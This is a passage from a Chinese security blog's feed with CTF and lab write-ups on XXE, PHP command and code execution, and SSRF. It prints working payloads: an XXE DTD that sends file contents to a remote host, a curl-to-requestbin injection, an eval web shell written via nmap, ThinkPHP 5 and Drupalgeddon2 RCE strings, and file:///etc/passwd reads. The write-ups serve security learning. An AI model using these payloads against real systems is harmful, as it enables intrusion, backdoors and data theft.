class="meta">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % file SYSTEM "file:///flag"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % remote SYSTEM "http://10.14.0.20:8887/test3.dtd"&gt;</span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>保存好重新压缩,命令是：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -r ../excel-exp.xlsx ./</span><br></pre></td></tr></table></figure><p>传上去，即可接收到 /flag 的内容：</p><p><img src="http://qiniuyun.lintstar.top/20200810223201.png" alt="20200810223201"></p><p>REQUEST平台也收到了请求：</p><p><img src="http://qiniuyun.lintstar.top/20200810223237.png" alt="20200810223237"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;XXE-漏洞&quot;&gt;&lt;a href=&quot;#XXE-漏洞&quot; class=&quot;headerlink&quot; title=&quot;XXE 漏洞&quot;&gt;&lt;/a&gt;XXE 漏洞&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;XML外部实体注入 / XXE(XMLExternalEntityInjection)漏洞&lt;
      
    
    </summary>
    
      <category term="渗透测试" scheme="https://winthorlimo.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web" scheme="https://winthorlimo.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>PHP命令执行漏洞</title>
    <link href="https://winthorlimo.github.io/note/2020/undefined10/cb4d799d.html"/>
    <id>https://winthorlimo.github.io/note/2020/undefined10/cb4d799d.html</id>
    <published>2020-08-10T14:00:00.000Z</published>
    <updated>2020-08-20T09:26:30.456Z</updated>
    
    <content type="html"><![CDATA[<h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><p>命令执行漏洞是指程序提供了<strong>直接执行 Shell 命令的函数</strong>的场景，当攻击者不合理使用，且开发者对用户参数未考虑安全因素的话，就会<strong>执行恶意的命令调用</strong>，被攻击者利用。</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>在编写PHP代码的过程中经常会有一些额外的需求，比如调用一个在系统中已经存在的命令，这时就需要调用一些函数来执行这些命令。</p><p>当这些代码中的参数可控的时候，恶意用户就可以插入自己想要执行的代码/命令，这些代码被执行之后就造成了漏洞。</p><blockquote><p><strong>命令字符串 → 生效命令</strong></p></blockquote><h2 id="PHP中造成命令执行漏洞的常用函数"><a href="#PHP中造成命令执行漏洞的常用函数" class="headerlink" title="PHP中造成命令执行漏洞的常用函数"></a>PHP中造成命令执行漏洞的常用函数</h2><blockquote><p><strong>1.string system(string <code>$</code>command[,int &amp;$return_var])</strong></p></blockquote><p>函数执行command参数所指定的命令，并且输出执行结果。</p><blockquote><p><strong>2.string exec(string <code>$</code>command[,array &amp;<code>$</code>output[,int &amp;$return_var]])</strong></p></blockquote><p>exec()执行command参数所指定的命令。</p><blockquote><p><strong>3.string shell_exec(string $cmd)</strong></p></blockquote><p>通过shell环境执行命令，并且将完整的输出以字符串的方式返回。</p><blockquote><p><strong>4.void passthru(string <code>$</code>command[,int &amp;$return_var])</strong></p></blockquote><p>执行外部程序并且显示原始输出。</p><blockquote><p><strong>5.<code></code>反引号</strong></p></blockquote><p>例如<code>ls</code>，反引号的内容会被当做系统命令执行，其中内部就是执行了 <strong>shell_exec()</strong> 函数进行处理。</p><blockquote><p><strong>6.void pcntl_exec(string <code>$</code>path[,array <code>$</code>args[,array <code>$</code>envs]])</strong></p></blockquote><p>pcntl是php的多进程处理扩展，在处理大量任务的情况下会使用到，pcntl需要额外安装。<code>$path</code>为可执行程序路径<code>(/bin/bash)</code>。<code>$args</code>表示传递给<code>$path</code>程序的参数。例如<code>pcntl_exec(“/bin/bash&quot;,array(&quot;whoami&quot;));</code>PHP中造成命令执行漏洞的常用函数</p><blockquote><p><strong>7.resource popen(string <code>$</code>command,string <code>$</code>mode)</strong></p></blockquote><p>打开一个指向进程的管道，该进程由派生给定的command命令执行而产生。例如<code>popen(&#39;whoami&gt;&gt;123.txt&#39;,&#39;r&#39;);</code></p><blockquote><p><strong>8.resource proc_open(string <code>$</code>cmd,array <code>$</code>descriptorspec,array &amp;<code>$</code>pipes[,  string<code>$</code>cwd[,array <code>$</code>env[, array <code>$</code>other_options]]])</strong></p></blockquote><p>执行一个命令，并且打开用来输入/输出的文件指针。类似popen()函数，但是<code>proc_open()</code>提供了更加强大的控制程序执行的能力。</p><h1 id="命令执行实战"><a href="#命令执行实战" class="headerlink" title="命令执行实战"></a>命令执行实战</h1><h2 id="Exec-command命令执行"><a href="#Exec-command命令执行" class="headerlink" title="Exec command命令执行"></a>Exec command命令执行</h2><p>题目：<a href="http://10.20.25.44:284/" target="_blank" rel="noopener">http://10.20.25.44:284/</a> 审计代码，找到命令执行点，拿到根目录下的flag。</p><p>代码审计看见exec.php很可疑</p><p><img src="http://qiniuyun.lintstar.top/20200806103324.png" alt="20200806103324"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">'library/MainFunction.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;link href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css" rel="stylesheet"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;link rel="stylesheet" href="assets/style.css"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;div class="contentBox"&gt;'</span>;</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$c = _GET(<span class="string">'command'</span>, <span class="string">'unknow'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($c == <span class="string">'unknow'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$handle = popen($c, <span class="string">"r"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ob_get_level() == <span class="number">0</span>) &#123;</span><br><span class="line">    ob_start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (!feof($handle)) &#123;</span><br><span class="line"></span><br><span class="line">    $buffer = fgets($handle);</span><br><span class="line">    $buffer = trim(htmlspecialchars($buffer));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $buffer . <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> str_pad(<span class="string">''</span>, <span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line">    ob_flush();</span><br><span class="line">    flush();</span><br><span class="line">    sleep(<span class="number">0.001</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pclose($handle);</span><br><span class="line">ob_end_flush();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;/div&gt;'</span>;</span><br></pre></td></tr></table></figure><p><code>$c = _GET(&#39;command&#39;, &#39;unknow&#39;);</code>解释：</p><p><img src="http://qiniuyun.lintstar.top/20200806103209.png" alt="20200806103209"></p><p>使用command命令执行获取flag：</p><p><img src="http://qiniuyun.lintstar.top/20200806102829.png" alt="20200806102829"></p><h2 id="Exec-拼接-命令执行"><a href="#Exec-拼接-命令执行" class="headerlink" title="Exec 拼接 命令执行"></a>Exec 拼接 命令执行</h2><p>题目：<a href="http://10.20.25.44:285/" target="_blank" rel="noopener">http://10.20.25.44:285/</a> 审计代码，找到命令执行点，拿到根目录下的 flag。</p><p>审计代码：</p><blockquote><p>Find In Path搜索 exec</p><p>目录在：/source/pack/127.0.0.1/download.php</p></blockquote><p><img src="http://qiniuyun.lintstar.top/20200806111015.png" alt="20200806111015"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">'tar zxvf work/'</span>.$dir.<span class="string">'/'</span>.$cert.<span class="string">'.zip -C work/'</span>.$dir);</span><br></pre></td></tr></table></figure><p>发现dir是由site和id拼接的，所以可以命令执行：</p><p><img src="http://qiniuyun.lintstar.top/20200806111348.png" alt="20200806111348"></p><p>因为没有回显，所以要把cat的内容放到根目录下的flag.txt中方便查看，payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.20.25.44:285/source/pack/127.0.0.1/download.php?site=1&amp;id=;cat /ffffffflllllaaaaaaggggggg &gt; /var/www/html/flag.txt</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200806113125.png" alt="20200806113125"></p><p><code>cat /</code>然后访问:</p><p><img src="http://qiniuyun.lintstar.top/20200806112724.png" alt="20200806112724"></p><p>得到flag:</p><p><img src="http://qiniuyun.lintstar.top/20200806113107.png" alt="20200806113107"></p><h2 id="Phtml-命令执行"><a href="#Phtml-命令执行" class="headerlink" title="Phtml 命令执行"></a>Phtml 命令执行</h2><p><strong>BUUCTF 上 Web 分类的 [⽹鼎杯 2020 朱雀组]Nmap</strong></p><p>打开，发现是一个扫描器。</p><p><img src="http://qiniuyun.lintstar.top/20200810225416.png" alt="20200810225416"></p><p>尝试扫描一下：</p><p><img src="http://qiniuyun.lintstar.top/20200810225446.png" alt="20200810225446"></p><p>测试一下，发现 ‘ 127.0.0.1 ‘ 的效果和 127.0.0.1 一样。</p><p><img src="http://qiniuyun.lintstar.top/20200810225629.png" alt="20200810225629"></p><p><img src="http://qiniuyun.lintstar.top/20200810225643.png" alt="20200810225643"></p><p>猜测此处存在命令注入，则可以测试能不能注入 &amp;&amp; 符号，但似乎并不能行。&amp;符号推测被屏蔽了。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' 127.0.0.1 &amp;&amp; curl http://http.requestbin.buuoj.cn/vfpc9rvf &amp;&amp; '</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200810225736.png" alt="20200810225736"></p><p>题目名字为 nmap，命令的返回格式也为 nmap，则思考是否能从 nmap 本身参数入手。<br>查询一下 nmap 的参数。</p><p><a href="https://nmap.org/man/zh/man-output.html" target="_blank" rel="noopener">https://nmap.org/man/zh/man-output.html</a></p><p><img src="http://qiniuyun.lintstar.top/20200810225804.png" alt="20200810225804"></p><p>有这些参数可以输出文件，那我们尝试用这些参数来输出文件试试。<br>尝试写出一个 dasctf.a。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' aa -oN dasctf.a '</span></span><br></pre></td></tr></table></figure><p>访问 /dasctf.a，写出成功。</p><p><img src="http://qiniuyun.lintstar.top/20200810225849.png" alt="20200810225849"></p><p>再来尝试写一个 php 试试，发现会被拦截，测试发现是 php 这个词被屏蔽了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' &lt;?php eval($_GET[a]);?&gt; -oN dasctf.php '</span></span><br></pre></td></tr></table></figure><p>搜索了解到在 Apache 服务器中，phtml 也会被当成 php 处理，咱们可尝试输出<code>phtml (-oN dasctf.phtml)</code>看看不会会被解析。</p><p>同时对于咱们要写出的内容，同样里面有 php 也会被屏蔽，所以咱们需要使用短标签<code>(&lt;?=eval($_GET[a]);?&gt;)</code>来尝试绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' &lt;?=eval($_GET[a]);?&gt; -oN dasctf.phtml '</span></span><br></pre></td></tr></table></figure><p>打上去，带上参数访问 dasctf.phtml，就会发现该文件被当成 php 解析，并且我们输入的参数被成功执行了。</p><p><img src="http://qiniuyun.lintstar.top/20200810230119.png" alt="20200810230119"></p><p>那么就可以拿 flag 了。</p><p><img src="http://qiniuyun.lintstar.top/20200810230134.png" alt="20200810230134"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;命令执行漏洞&quot;&gt;&lt;a href=&quot;#命令执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;命令执行漏洞&quot;&gt;&lt;/a&gt;命令执行漏洞&lt;/h1&gt;&lt;p&gt;命令执行漏洞是指程序提供了&lt;strong&gt;直接执行 Shell 命令的函数&lt;/strong&gt;的场景，当攻击者
      
    
    </summary>
    
      <category term="渗透测试" scheme="https://winthorlimo.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web" scheme="https://winthorlimo.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码执行漏洞</title>
    <link href="https://winthorlimo.github.io/note/2020/undefined09/68937ff4.html"/>
    <id>https://winthorlimo.github.io/note/2020/undefined09/68937ff4.html</id>
    <published>2020-08-09T14:00:00.000Z</published>
    <updated>2020-08-20T09:26:32.395Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP代码执行漏洞"><a href="#PHP代码执行漏洞" class="headerlink" title="PHP代码执行漏洞"></a>PHP代码执行漏洞</h1><p>在开发中经常需要能灵活地插入一些代码，并且使这些代码生效，例如：</p><ul><li>系统主题模板的调用</li><li>灵活地逻辑判断</li></ul><p>当这些代码中的参数可控的时候，恶意用户就可以插入自己想要执行的代码/命令，这些代码被执行之后就造成了漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[<span class="string">'a'</span>]($_POST[_]);</span><br></pre></td></tr></table></figure><h1 id="PHP中造成代码执行漏洞的常用函数"><a href="#PHP中造成代码执行漏洞的常用函数" class="headerlink" title="PHP中造成代码执行漏洞的常用函数"></a>PHP中造成代码执行漏洞的常用函数</h1><h2 id="eval与assert"><a href="#eval与assert" class="headerlink" title="eval与assert"></a>eval与assert</h2><h3 id="1-mixed-eval-string-code"><a href="#1-mixed-eval-string-code" class="headerlink" title="1.mixed eval( string $code)"></a><code>1.mixed eval( string $code)</code></h3><p>把字符串code作为PHP代码执行。</p><ul><li>代码不能包含打开/关闭PHPtags。比如不能传入：<code>&#39;&lt;?phpecho&quot;Hi!&quot;;?&gt;&#39;</code>。但仍然可以用合适的PHPtag来离开、重新进入PHP模式。比如<code>&#39;echo&quot;InPHPmode!&quot;;?&gt;InHTMLmode!&lt;?phpecho&quot;BackinPHPmode!&quot;;&#39;</code>。</li><li>传入的必须是有效的PHP代码。所有的语句必须以分号结尾。比如<code>&#39;echo&quot;Hi!&quot;&#39;</code>会导致一个parseerror，而<code>&#39;echo&quot;Hi!&quot;;&#39;</code>则会正常运行。</li></ul><h3 id="2-bool-assert-mixed-assertion-string-description"><a href="#2-bool-assert-mixed-assertion-string-description" class="headerlink" title="2.bool assert (mixed $assertion [,string $description] )"></a><code>2.bool assert (mixed $assertion [,string $description] )</code></h3><p>PHP语言中是用来判断一个表达式是否成立，返回trueorfalse。</p><p>如果assertion是字符串，它将会被assert()当做PHP代码来执行。</p><h2 id="调用函数过滤不当"><a href="#调用函数过滤不当" class="headerlink" title="调用函数过滤不当"></a>调用函数过滤不当</h2><p>call_user_func()、call_user_func_array()、array_map()等几十个函数都可以调用其他函数的功能。其中一个参数为调用的函数名，如果这个传入的函数名可控，那就可以调用意外的函数来执行我们想执行的代码。</p><h3 id="1-mixedcall-user-func-callable-callback-mixed-parameter-mixed"><a href="#1-mixedcall-user-func-callable-callback-mixed-parameter-mixed" class="headerlink" title="1.mixedcall_user_func(callable$callback[,mixed$parameter[,mixed$...]])"></a><code>1.mixedcall_user_func(callable$callback[,mixed$parameter[,mixed$...]])</code></h3><p>第一个参数callback是被调用的回调函数，其余参数是回调函数的参数。</p><p>该类函数的功能是调用函数，多用在框架中动态调用函数。所以一些小的程序出现这种方式的代码执行会很少。</p><h3 id="2-arrayarray-map-callable-callback-array-array1-array"><a href="#2-arrayarray-map-callable-callback-array-array1-array" class="headerlink" title="2.arrayarray_map(callable$callback,array$array1[,array$...])"></a><code>2.arrayarray_map(callable$callback,array$array1[,array$...])</code></h3><p>返回数组，是为array1每个元素应用callback函数之后的数组。callback函数形参的数量和传给array_map()数组数量，两者必须一样。</p><h2 id="动态函数执行"><a href="#动态函数执行" class="headerlink" title="动态函数执行"></a>动态函数执行</h2><p><strong>由于PHP的特性原因，PHP的函数名称可以由字符串进行拼接</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="string">'a'</span>.<span class="string">'s'</span>.<span class="string">'s'</span>.<span class="string">'e'</span>.<span class="string">'r'</span>.<span class="string">'t’;</span></span><br><span class="line"><span class="string">$a('</span>phpinfo()<span class="string">');</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[<span class="string">'a'</span>]($_POST[_]);</span><br></pre></td></tr></table></figure><p><strong>基于该类写法变形出来的各种异性，经常被当作Web后门使用</strong></p><h1 id="代码执行拼接思路"><a href="#代码执行拼接思路" class="headerlink" title="代码执行拼接思路"></a>代码执行拼接思路</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump('a' === '$_GET[abc]');"</span>);</span><br></pre></td></tr></table></figure><p>调回显出来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">"var_dump('a' === '$_GET[abc]');"</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump('a' === '$_GET[abc]');"</span>);</span><br></pre></td></tr></table></figure><p>这里还是类比SQL注入时候的拼接思路：<strong>既要符合语法，还要能够执行</strong>。</p><p><code>&#39;);phpinfo();//);</code>然后用<code>&#39;);</code>把前面语句闭合执行中间的phpinfo,最后用<code>//</code>注释掉后面的语句。</p><h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(&quot;&apos;a&apos; === &apos;$_GET[abc]&apos;&quot;);</span><br><span class="line">assert(&quot;&apos;a&apos; === &apos;$_GET[abc]&apos;&quot;);</span><br><span class="line">echo &quot;continue&quot;;</span><br></pre></td></tr></table></figure><p><code>http://127.0.0.1:8891/a.php?abc=&#39;.phpinfo().&#39;</code></p><p>拼接效果：<code>&#39;&#39;a&#39; === &#39;&#39;.phpinfo().&#39;&#39;&#39;</code></p><h1 id="代码执行实战"><a href="#代码执行实战" class="headerlink" title="代码执行实战"></a>代码执行实战</h1><h2 id="phpunit-eval-代码执行"><a href="#phpunit-eval-代码执行" class="headerlink" title="phpunit_eval 代码执行"></a>phpunit_eval 代码执行</h2><p><a href="http://10.20.25.44:283/" target="_blank" rel="noopener">http://10.20.25.44:283/</a></p><p>代码审计发现敏感函数：<br><code>eval(&#39;?&gt;&#39;.fille_get_contents(&#39;php://input&#39;));</code></p><p>找到文件路径：<br><code>http://10.20.25.44:283/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></p><p>代码执行，打印根目录：</p><p><img src="http://qiniuyun.lintstar.top/20200805154855.png" alt="20200805154855"></p><p>查看flag:</p><p><img src="http://qiniuyun.lintstar.top/20200805155034.png" alt="20200805155034"></p><h2 id="thinkphp-5-0-20-远程代码执行漏洞"><a href="#thinkphp-5-0-20-远程代码执行漏洞" class="headerlink" title="thinkphp 5.0.20 远程代码执行漏洞"></a>thinkphp 5.0.20 远程代码执行漏洞</h2><p>2018年12月10日，ThinkPHP 官方发布《ThinkPHP 5.* 版本安全更新》，修复了一个远程代码执行漏洞。由于 ThinkPHP 框架对控制器名没有进行足够的检测,导致攻击者可能可以实现远程代码执行。</p><p>题目：<a href="http://10.20.25.44:280" target="_blank" rel="noopener">http://10.20.25.44:280</a></p><p>转载：<a href="https://blog.knownsec.com/2018/12/thinkphp5-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" target="_blank" rel="noopener">https://blog.knownsec.com/2018/12/thinkphp5-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/</a></p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure><p>访问：<code>http://10.20.25.44:280/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code></p><p>显示id说明可以远程代码执行：</p><p><img src="http://qiniuyun.lintstar.top/20200805163326.png" alt="20200805163326"></p><p>修改payload 先<code>ls /</code>显示根目录</p><p><img src="http://qiniuyun.lintstar.top/20200805163426.png" alt="20200805163426"></p><p>看到fffffflllllaaaaaggggg，cat一下：</p><p><img src="http://qiniuyun.lintstar.top/20200805163552.png" alt="20200805163552"></p><h2 id="Drupal-Drupalgeddon-2-远程代码执行漏洞（CVE-2018-7600）"><a href="#Drupal-Drupalgeddon-2-远程代码执行漏洞（CVE-2018-7600）" class="headerlink" title="Drupal Drupalgeddon 2 远程代码执行漏洞（CVE-2018-7600）"></a>Drupal Drupalgeddon 2 远程代码执行漏洞（CVE-2018-7600）</h2><p>2018年3月28日，Drupal官方发布新补丁和安全公告，宣称Drupal 6,7,8等多个子版本存在远程代码执行漏洞，攻击者可以利用Drupal网站漏洞，执行恶意代码，导致网站被完全控制。</p><p>详见：</p><ul><li><p><a href="https://blog.csdn.net/qq_43622442/article/details/105689178" target="_blank" rel="noopener">https://blog.csdn.net/qq_43622442/article/details/105689178</a></p></li><li><p><a href="https://blog.csdn.net/limb0/article/details/107122919" target="_blank" rel="noopener">https://blog.csdn.net/limb0/article/details/107122919</a></p></li></ul><p>题目：<a href="http://10.20.25.44:286/" target="_blank" rel="noopener">http://10.20.25.44:286/</a><br>CMS：drupal-8.5.0</p><p><img src="http://qiniuyun.lintstar.top/20200805170556.png" alt="20200805170556"></p><p><code>/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/</code></p><p>payload:<br><code>form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=system&amp;mail[#type]=markup&amp;mail[#markup]=id</code></p><p>执行<code>ls /</code></p><p><img src="http://qiniuyun.lintstar.top/20200805170431.png" alt="20200805170431"></p><p>得到flag:</p><p><img src="http://qiniuyun.lintstar.top/20200805170512.png" alt="20200805170512"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHP代码执行漏洞&quot;&gt;&lt;a href=&quot;#PHP代码执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;PHP代码执行漏洞&quot;&gt;&lt;/a&gt;PHP代码执行漏洞&lt;/h1&gt;&lt;p&gt;在开发中经常需要能灵活地插入一些代码，并且使这些代码生效，例如：&lt;/p&gt;
&lt;ul&gt;

      
    
    </summary>
    
      <category term="渗透测试" scheme="https://winthorlimo.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web" scheme="https://winthorlimo.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>SSRF服务端请求伪造攻击</title>
    <link href="https://winthorlimo.github.io/note/2020/undefined08/ce4db0e6.html"/>
    <id>https://winthorlimo.github.io/note/2020/undefined08/ce4db0e6.html</id>
    <published>2020-08-08T14:00:00.000Z</published>
    <updated>2020-08-20T09:26:23.002Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SSRF服务端请求伪造攻击"><a href="#SSRF服务端请求伪造攻击" class="headerlink" title="SSRF服务端请求伪造攻击"></a>SSRF服务端请求伪造攻击</h1><h2 id="什么是SSRF"><a href="#什么是SSRF" class="headerlink" title="什么是SSRF"></a>什么是SSRF</h2><p>服务端请求伪造攻击（Server-sideRequestForgery）简称SSRF，当WEB应用提供了从其他服务器获取数据的功能，但没有对远程服务器地址和远程服务器返回的信息进行合理的验证和过滤，就可能存在这种服务端请求伪造。</p><h2 id="SSRF漏洞可以做什么"><a href="#SSRF漏洞可以做什么" class="headerlink" title="SSRF漏洞可以做什么"></a>SSRF漏洞可以做什么</h2><ol><li><p>可以扫描内部网络，获得端口、服务信息</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?url=192.168.32.158:22</span><br><span class="line">http://10.20.65.13/?url=10.20.65.13:22</span><br><span class="line"></span><br><span class="line">?url=127.0.0.1:3306</span><br></pre></td></tr></table></figure></li><li><p>对内网Web应用进行指纹识别，通过访问默认文件实现</p></li><li><p>对内部任意主机和任意端口发送精心构造的请求包进行攻击 (struts2、SQL注入)</p></li><li><p>利用file协议读取本地文件</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source：192.168.32.158：:8080/?url=file:///etc/passwd</span><br></pre></td></tr></table></figure></li><li><p>越过网络防火墙</p></li></ol><p><img src="http://qiniuyun.lintstar.top/20200805101247.png" alt="20200805101247"></p><h1 id="SSRF漏洞探测"><a href="#SSRF漏洞探测" class="headerlink" title="SSRF漏洞探测"></a>SSRF漏洞探测</h1><p><strong>能够对外发起网络请求的地方，就可能存在SSRF</strong></p><ol><li>从远程服务器请求资源 (图片代下载)</li><li>转码服务</li><li>在线翻译</li><li>未公开的api实现以及其他调用URL的功能</li><li>数据库内置功能</li><li>Webmail收取其他邮箱邮件 (pop3,imap,smtp)</li><li>文件处理，编码处理，属性处理 (xmlrpc.xml)</li></ol><h1 id="SSRF漏洞利用"><a href="#SSRF漏洞利用" class="headerlink" title="SSRF漏洞利用"></a>SSRF漏洞利用</h1><h2 id="SSRF有关的函数"><a href="#SSRF有关的函数" class="headerlink" title="SSRF有关的函数"></a>SSRF有关的函数</h2><p><strong>PHP:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>file_get_contents()</span><br><span class="line"><span class="number">2.</span>fsockopen()</span><br><span class="line"><span class="number">3.</span>curl_exec()</span><br><span class="line"><span class="number">4.</span>fopen()</span><br></pre></td></tr></table></figure><p><strong>Python:</strong></p><ol><li>urllib 库http头注入</li><li>requests等库中默认跟随30x跳转</li></ol><h2 id="SSRF常见利用–file-协议"><a href="#SSRF常见利用–file-协议" class="headerlink" title="SSRF常见利用–file://协议"></a>SSRF常见利用–file://协议</h2><p>使用file协议读取源码敏感文件，配合fuzz字典，信息搜集</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source：192.168.32.158：:8080/1.php?url=file:///etc/passwd</span><br></pre></td></tr></table></figure><h2 id="SSRF常见利用–dict-协议"><a href="#SSRF常见利用–dict-协议" class="headerlink" title="SSRF常见利用–dict://协议"></a>SSRF常见利用–dict://协议</h2><p>使用dict://协议刺探内网端口信息</p><h2 id="SSRF常见利用–Gopher-协议"><a href="#SSRF常见利用–Gopher-协议" class="headerlink" 